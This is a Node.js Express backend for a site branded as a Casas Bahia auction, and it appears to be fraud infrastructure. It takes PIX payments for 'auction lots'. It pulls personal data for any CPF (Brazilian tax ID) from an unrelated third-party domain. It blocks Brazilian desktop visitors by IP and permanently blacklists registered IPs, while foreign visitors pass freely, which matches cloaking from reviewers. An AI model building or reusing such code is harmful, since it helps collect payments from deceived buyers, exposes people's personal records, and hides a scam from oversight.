'use strict';

const express = require('express');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

app.set('trust proxy', 1); // IPs reais no Heroku

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─── IP Blocker (PostgreSQL permanente) ──────────────────────────────────────

const { Pool } = require('pg');
const pgPool = new Pool({ connectionString: process.env.DATABASE_URL });

// Garante que a tabela existe ao iniciar
pgPool.query(`
  CREATE TABLE IF NOT EXISTS blocked_ips (
    ip TEXT PRIMARY KEY,
    blocked_at TIMESTAMPTZ DEFAULT NOW()
  )
`).catch(() => {});

const geoip = require('geoip-lite');

function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return String(forwarded).split(',')[0].trim();
  return req.socket?.remoteAddress || req.ip || '';
}

function getCountry(ip) {
  try {
    return geoip.lookup(ip)?.country || '';
  } catch {
    return '';
  }
}

function isBrIp(ip) {
  return getCountry(ip) === 'BR';
}

// Cache em memória para evitar query ao Postgres a cada page load
// blocked=true: permanente | blocked=false: expira em 5 min
const blockCache = new Map(); // ip -> { blocked, allowDesktop, expiresAt }
const CACHE_TTL_MS = 5 * 60 * 1000; // 5 minutos para "não bloqueado"

app.get('/api/block/check', async (req, res) => {
  const ip = getClientIp(req);

  // Somente IPs brasileiros têm bloqueio de desktop.
  // Qualquer outro país (EUA, Índia, etc.) acessa normalmente.
  if (!isBrIp(ip)) {
    return res.json({ blocked: false, allowDesktop: true, ip });
  }

  // Verifica cache
  const cached = blockCache.get(ip);
  if (cached && (cached.blocked || Date.now() < cached.expiresAt)) {
    return res.json({ blocked: cached.blocked, allowDesktop: false, ip });
  }

  try {
    const result = await pgPool.query(
      'SELECT 1 FROM blocked_ips WHERE ip = $1 LIMIT 1',
      [ip]
    );
    const blocked = result.rowCount > 0;
    blockCache.set(ip, {
      blocked,
      expiresAt: blocked ? Infinity : Date.now() + CACHE_TTL_MS,
    });
    res.json({ blocked, allowDesktop: false, ip });
  } catch {
    res.json({ blocked: false, allowDesktop: false, ip });
  }
});

app.post('/api/block/register', async (req, res) => {
  const ip = getClientIp(req);
  try {
    await pgPool.query(
      'INSERT INTO blocked_ips (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING',
      [ip]
    );
    // Atualiza cache imediatamente
    blockCache.set(ip, { blocked: true, expiresAt: Infinity });
    res.json({ ok: true, ip });
  } catch {
    res.json({ ok: false, ip });
  }
});

// ─── Health ───────────────────────────────────────────────────────────────────

app.get('/api/healthz', (_req, res) => {
  res.json({ status: 'ok' });
});

// ─── CPF consulta ─────────────────────────────────────────────────────────────

app.get('/api/cpf/consulta', async (req, res) => {
  const cpf = String(req.query.cpf || '').replace(/\D/g, '');
  if (cpf.length !== 11) {
    return res.status(400).json({ error: 'CPF inválido' });
  }
  try {
    const response = await axios.get(
      `https://renouvaslab.beauty/api/consulta.php?cpf=${cpf}`,
      { timeout: 10000 }
    );
    return res.json(response.data);
  } catch (err) {
    return res.status(502).json({ error: 'Erro ao consultar CPF' });
  }
});

// ─── Pagnet helpers ───────────────────────────────────────────────────────────

const PAGNET_BASE = 'https://api.pagnetbrasil.com/v1';
const PAGNET_PAID = new Set(['paid', 'approved', 'captured', 'authorized', 'settled']);

function getPagnetAuth() {
  const pub = process.env.PAGNET_PUBLIC_KEY;
  const sec = process.env.PAGNET_SECRET_KEY;
  if (!pub || !sec) throw new Error('PAGNET_PUBLIC_KEY / PAGNET_SECRET_KEY ausentes');
  return 'Basic ' + Buffer.from(`${pub}:${sec}`).toString('base64');
}

function isPaid(status) {
  return PAGNET_PAID.has(String(status || '').toLowerCase());
}

// ─── PIX create ───────────────────────────────────────────────────────────────

app.post('/api/pix/create', async (req, res) => {
  try {
    const { name, email, cpf, phone, amount, lotTitle } = req.body;

    if (!name || !cpf || !amount) {
      return res.status(400).json({ error: 'name, cpf e amount são obrigatórios' });
    }

    const cleanCpf = cpf.replace(/\D/g, '');
    const cleanPhone = (phone || '11999999999').replace(/\D/g, '');
    const amountCents = Math.round(Number(amount) * 100);
    const externalReference = `PIX${Date.now()}${Math.random().toString(36).slice(0, 8).toUpperCase()}`;

    const payload = {
      amount: amountCents,
      paymentMethod: 'pix',
      pix: { expiresInDays: 3 },
      items: [
        {
          title: lotTitle || 'Lote Leilão Casas Bahia',
          unitPrice: amountCents,
          quantity: 1,
          tangible: false,
        },
      ],
      customer: {
        name,
        email: email || `${cleanCpf}@arrematante.com.br`,
        document: { type: 'cpf', number: cleanCpf },
        phone: cleanPhone,
      },
      externalReference,
    };

    const response = await axios.post(`${PAGNET_BASE}/transactions`, payload, {
      headers: { Authorization: getPagnetAuth(), 'Content-Type': 'application/json' },
      timeout: 15000,
    });

    const data = response.data;
    const pixCode = (data.pix && data.pix.qrcode) || data.qrCode || data.qrcode || null;
    const txId = String(data.id || data.transactionId || externalReference);

    console.log(`[PAGNET] PIX criado — id: ${txId} status: ${data.status}`);
    return res.json({
      id: txId,
      status: data.status || 'pending',
      pixCode,
      expirationDate: null,
    });
  } catch (err) {
    const errData = err.response && err.response.data;
    const msg =
      (errData && errData.message) ||
      (errData && errData.error) ||
      err.message ||
      'Erro ao criar transação';
    console.error(`[PAGNET] Erro ao criar PIX: ${msg}`);
    if (errData) console.error('[PAGNET] Resposta:', JSON.stringify(errData));
    return res.status(500).json({ error: msg });
  }
});

// ─── PIX status (polling direto na Pagnet) ────────────────────────────────────

app.get('/api/pix/status/:id', async (req, res) => {
  try {
    const response = await axios.get(`${PAGNET_BASE}/transactions/${req.params.id}`, {
      headers: { Authorization: getPagnetAuth(), Accept: 'application/json' },
      timeout: 10000,
    });
    const data = response.data;
    const status = data.status || 'pending';
    return res.json({ id: req.params.id, status, paidAt: isPaid(status) ? new Date().toISOString() : null });
  } catch (err) {
    const msg = (err.response && err.response.data && err.response.data.message) || err.message || 'Erro ao consultar transação';
    return res.status(500).json({ error: msg });
  }
});

// ─── PIX stream — SSE real-time confirmation via polling ─────────────────────

app.get('/api/pix/stream/:id', (req, res) => {
  const txId = req.params.id;

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders();

  let closed = false;
  let pollTimer = null;
  let heartbeatTimer = null;

  function cleanup() {
    closed = true;
    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
    if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
  }

  function send(data) {
    if (!closed) res.write('data: ' + JSON.stringify(data) + '\n\n');
  }

  heartbeatTimer = setInterval(() => {
    if (!closed) res.write(': heartbeat\n\n');
  }, 20000);

  // Poll Pagnet a cada 3s
  pollTimer = setInterval(async () => {
    if (closed) return;
    try {
      const response = await axios.get(`${PAGNET_BASE}/transactions/${txId}`, {
        headers: { Authorization: getPagnetAuth(), Accept: 'application/json' },
        timeout: 8000,
      });
      const data = response.data;
      if (isPaid(data.status || '')) {
        send({ type: 'payment_approved', status: data.status });
        cleanup();
        res.end();
      }
    } catch {
      // continua tentando em erros transientes
    }
  }, 3000);

  const timeout = setTimeout(() => {
    if (!closed) {
      send({ type: 'timeout' });
      cleanup();
      res.end();
    }
  }, 10 * 60 * 1000);

  req.on('close', () => {
    clearTimeout(timeout);
    cleanup();
  });
});

// ─── Static frontend (built by Vite) ─────────────────────────────────────────

const STATIC_DIR = path.join(__dirname, 'artifacts', 'leilao-cb', 'dist', 'public');

app.use(express.static(STATIC_DIR));

app.get('*', (_req, res) => {
  res.sendFile(path.join(STATIC_DIR, 'index.html'));
});

// ─── Start ────────────────────────────────────────────────────────────────────

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});

process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully...');
  process.exit(0);
});
